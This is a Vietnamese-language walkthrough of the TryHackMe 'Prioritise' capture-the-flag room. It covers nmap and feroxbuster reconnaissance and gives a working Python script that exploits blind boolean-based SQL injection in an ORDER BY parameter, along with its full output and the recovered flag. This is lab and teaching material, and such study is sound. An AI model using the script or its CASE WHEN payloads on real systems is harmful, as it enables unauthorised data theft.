# TryHackMe - Prioritise 
![[room.png]]

> **Room Name:** Prioritise
> **Mức độ:** Trung bình 
> **Thời gian:** 25 phút 
> **Url:** [Prioritise](https://tryhackme.com/room/prioritise)
> **Chủ để:** Pentest Web, SQL Injection 

---
## Bảng nội dung

- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Analyst](#analyst)
- [Exploit](#exploit)
- [Conclusion](#conclusion)

---
## Reconnaissance
### Nmap

``` bash
nmap -sSVC -O -Pn 10.48.184.137
```

Output: 

```
└─$ nmap -sSVC -O -Pn 10.48.184.137                
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 23:20 -0400
Nmap scan report for 10.48.184.137
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 66:cb:98:32:58:ef:dc:d5:83:8b:d1:a1:b7:04:a1:9d (RSA)
|   256 18:18:ce:27:bb:90:f5:f0:69:a6:75:ef:4a:09:d4:f0 (ECDSA)
|_  256 5d:ce:bb:42:f4:88:2a:67:0a:0f:2f:35:c2:c3:c7:9a (ED25519)
80/tcp open  sip     (SIP end point; Status: 404 NOT FOUND)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2756
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="../static/css/bootstrap.min.css"
|     crossorigin="anonymous"
|     <link
|     rel="stylesheet"
|     href="../static/css/font-awesome.min.css"
|     crossorigin="anonymous"
|     <link
|     rel="stylesheet"
|     href="../static/css/bootstrap-datepicker.min.css"
|     crossorigin="anonymous"
|     <title>Prioritise</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">Prioritise</span></a>
|     <button
|     class="na
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|_    Content-Length: 0
|_http-title: Prioritise
```

### Tìm thấy 

| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 |
| 80   | HTTP    | SIP(?)                          |
> [!NOTE]
> Tìm thấy 2 dịch vụ ssh, web nên tập trung vào dịch vụ web 
> Nếu quét tất cả các cổng cũng không phát hiện gì thêm 

---
## Enumeration

### Feroxbuster 

``` bash
feroxbuster -u http://10.48.184.137/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -d 2 -C 404
```

Output:

```text 
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.48.184.137/
 🚩  In-Scope Url          │ 10.48.184.137
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        4l       23w      178c http://10.48.184.137/new
200      GET        2l     1276w    88147c http://10.48.184.137/static/js/jquery.min.js
200      GET        7l     1865w   152522c http://10.48.184.137/static/css/bootstrap.min.css
200      GET        7l      757w    15737c http://10.48.184.137/static/css/bootstrap-datepicker.min.css
200      GET        8l      403w    33700c http://10.48.184.137/static/js/bootstrap-datepicker.min.js
200      GET        4l       66w    31000c http://10.48.184.137/static/css/font-awesome.min.css
200      GET        7l      762w    59225c http://10.48.184.137/static/js/bootstrap.min.js
200      GET      102l      165w     2756c http://10.48.184.137/
[####################] - 23s     4762/4762    0s      found:8       errors:451    
[####################] - 23s     4751/4751    206/s   http://10.48.184.137/
```

> [!NOTE]
> Quét thư mục ẩn không phát hiện thư mục ẩn đáng chú ý nào của dịch vụ web

---
## Analyst

>[!NOTE]
>Đây là 1 web với tính năng chính là Todo List 
>Với các chức năng chính 
> - Thêm, xóa todo, đánh dấu hoàn thành 
> - Sắp xếp các todo theo title, date, createat
> - Phân tích chức năng thêm todo thì không có khả năng chèn lệnh, SQL Injection vì sẽ gây lỗi 500 phía server 
> - Chức năng sắp xếp đáng chú ý vì nhận tham số từ URL 

### Phân tích chức năng sắp xếp 

![[titleasc.png]]

![[titledesc.png]]

>[!NOTE]
>Nếu chèn gửi với tham số `title desc --` thì kết quả trả về sẽ được sắp xếp theo title theo chiều lớn đến nhỏ 
>Có lỗ hổng SQL Injection có thể phía server có truy vấn sql định dạng `SELECT * FROM tasks ORDER BY {orders}`
>Có thể tạo chương trình để tấn công lỗ hổng này hoặc dùng SQL map 

---
## Exploit 

>[!Khai thác]
>Có thể khai thác lỗ hổng này bằng boolean-based SQL injection chúng ta dựa vào kết quả trả về để kiểm tra dữ liệu đầu vào phương pháp thử và sai 
>Payload cơ bản `(CASE WHEN (SELECT SUBSTRING(flag,1,1) from flag) = 'a' then title else date end)`
> - Nếu 'a' có tồn tại trong bảng dữ liệu flag thì kết quả trả về sẽ là sắp xếp theo title 
> - Nếu 'a' không tồn tại trong flag thì sắp xếp theo date 
>
>Cần tạo bộ dữ liệu để khi sắp xếp theo title khác sắp xếp theo date 
>Tạo chương trình để khai thác lỗ hổng này thử từng kí tự có thể để xây dựng flag đến khi gắp kí tự '}' kết thúc flag 

### Tạo chương trình khai thác 

```Python
import string, requests
from bs4 import BeautifulSoup

chars = list(string.printable)
url = "http://10.48.183.134/"
flag = ""
res = []

def sendRequestGetFirstRow(payload):
    params = {
        "order": payload
    }
    response = requests.get(url, params)
    if response.status_code != 200:
        return None
    soup = BeautifulSoup(response.text, "html.parser")
    first_row = soup.select_one("tbody tr")
    if first_row is None:
        return None
    return first_row.get_text(" ", strip=True)

def createRes():
    print("[+] Tao bo du lieu de so sanh khi SQLi")
    print(f"-- Get {url}?order=title")
    first_row = sendRequestGetFirstRow("title")
    res.append(first_row)

    print(f"-- Get {url}?order=date")
    first_row = sendRequestGetFirstRow("date")
    res.append(first_row)
    print("[+] Tao bo du lieu thanh cong!")

def sqli():
    global flag
    for c in chars:
        s = flag + c
        payload = f"(CASE WHEN (SELECT SUBSTRING(flag,1,{len(s)}) from flag) = '{s}' then title else date end)"
        first_row = sendRequestGetFirstRow(payload)
        if first_row == res[0]:
            print(f"[+] Payload chinh xac: {payload}")
            flag = s 
            return
        
print("[+]Chuong trinh SQLi web qua tham so order!")
createRes()

print("[+] SQL Injection qua tham so order va sql case-when")
print("--- Neu du lieu tra ve sap xep theo title thi ki tu do chinh xac")
print("--- Neu du lieu tra ve sap xep theo date thi ki tu do sai")
while True:
    sqli()
    if '}' in flag:
        print(f"[+] Tim thay flag: {flag}")
        print(f"[+] Ket thuc chuong trinh!")
        break

```

> [!Note]
> Chương trình khai thác lỗ hổng SQL Injection để lấy thông tin flag 
> - Đầu tiên gọi hàm `createRes()` để lấy hàng đầu tiên trong bảng dữ liệu trả về để thấy khác nhau giữa sắp xếp theo title và date 
> - Tiếp theo là vòng lặp đến khi trong flag có '}'
>	+ Ở mỗi lần lắp sẽ lấy 1 kí tự có thể hiển thị ghép với flag rồi tiến hành gửi request 
>	+ Với payload `(CASE WHEN (SELECT SUBSTRING(flag,1,{len(s)}) from flag) = '{s}' then title else date end)`
>	+ Mỗi request kiểm tra mã lỗi, dữ liệu trả có rỗng không và trả về dữ liệu dòng đầu tiên trong tasks 
>	+ So sánh dữ liệu trả về với reponse nếu sắp xếp theo title nếu đúng đó là kí tự chính xác 

### Chạy chương trình 

Lệnh thực thi
``` Bash
chmod +x sqli.py #Cấp quyền thực thi 
python3 sqli.py
```

Đầu ra

```
[+]Chuong trinh SQLi web qua tham so order!
[+] Tao bo du lieu de so sanh khi SQLi
-- Get http://10.48.183.134/?order=title
-- Get http://10.48.183.134/?order=date
[+] Tao bo du lieu thanh cong!
[+] SQL Injection qua tham so order va sql case-when
--- Neu du lieu tra ve sap xep theo title thi ki tu do chinh xac
--- Neu du lieu tra ve sap xep theo date thi ki tu do sai
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,1) from flag) = 'f' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,2) from flag) = 'fl' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,3) from flag) = 'fla' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,4) from flag) = 'flag' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,5) from flag) = 'flag{' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,6) from flag) = 'flag{6' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,7) from flag) = 'flag{65' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,8) from flag) = 'flag{65f' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,9) from flag) = 'flag{65f2' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,10) from flag) = 'flag{65f2f' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,11) from flag) = 'flag{65f2f8' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,12) from flag) = 'flag{65f2f8c' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,13) from flag) = 'flag{65f2f8cf' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,14) from flag) = 'flag{65f2f8cfd' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,15) from flag) = 'flag{65f2f8cfd5' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,16) from flag) = 'flag{65f2f8cfd53' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,17) from flag) = 'flag{65f2f8cfd53d' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,18) from flag) = 'flag{65f2f8cfd53d5' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,19) from flag) = 'flag{65f2f8cfd53d59' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,20) from flag) = 'flag{65f2f8cfd53d594' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,21) from flag) = 'flag{65f2f8cfd53d5942' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,22) from flag) = 'flag{65f2f8cfd53d59422' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,23) from flag) = 'flag{65f2f8cfd53d59422f' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,24) from flag) = 'flag{65f2f8cfd53d59422f3' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,25) from flag) = 'flag{65f2f8cfd53d59422f3d' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,26) from flag) = 'flag{65f2f8cfd53d59422f3d7' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,27) from flag) = 'flag{65f2f8cfd53d59422f3d7c' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,28) from flag) = 'flag{65f2f8cfd53d59422f3d7cc' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,29) from flag) = 'flag{65f2f8cfd53d59422f3d7cc6' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,30) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,31) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62c' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,32) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62cc' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,33) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62cc8' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,34) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62cc8f' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,35) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62cc8fd' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,36) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62cc8fdc' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,37) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62cc8fdcd' then title else date end)
[+] Payload chinh xac: (CASE WHEN (SELECT SUBSTRING(flag,1,38) from flag) = 'flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}' then title else date end)
[+] Tim thay flag: flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
[+] Ket thuc chuong trinh!
```

-> FLag: flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}

---
## Conclusion

>[!NOTE]
>Thử thách này liên quan đến việc khai thác lỗ hổng SQL Injection bằng phương pháp boolean-based thử và sai để tìm flag qua tham số order trên URL 
>Để khắc phục lỗ hổng này cần tạo bộ lọc tham số ở cả FrontEnd và Backend kết hợp sử dụng tham số trong truy vấn SQL.